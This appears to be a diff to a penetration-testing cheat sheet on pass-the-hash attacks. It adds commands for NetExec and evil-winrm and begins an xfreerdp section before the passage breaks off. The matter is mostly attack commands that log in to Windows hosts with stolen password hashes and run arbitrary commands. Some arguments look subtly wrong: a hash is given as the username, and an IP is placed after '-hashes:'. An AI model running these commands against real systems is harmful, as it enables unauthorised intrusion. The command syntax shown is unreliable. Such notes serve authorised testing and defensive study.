@@ -34,5 +34,14 @@ impacket-psexec <accountname>@<ip> -hashes:<ip>
 -Passing the Hash with NetExec:
 By using NetExec, we can perform Pass The Hash attack and execute our desired command:
 ```
-
+netexec smb <ip> -u <hash> -d <domain> -H <hash> -x <command>
 ```
+
+-Passing the hash with evil-winrm:
+When smb is blocked, we can use evil-winrm to archive the above:
+```
+evil-winrm -i <ip> -u <username> -H <hash>
+```
+
+-Passing the hash with RDP:
+By using xfreerdp, we can use PTH technique and 
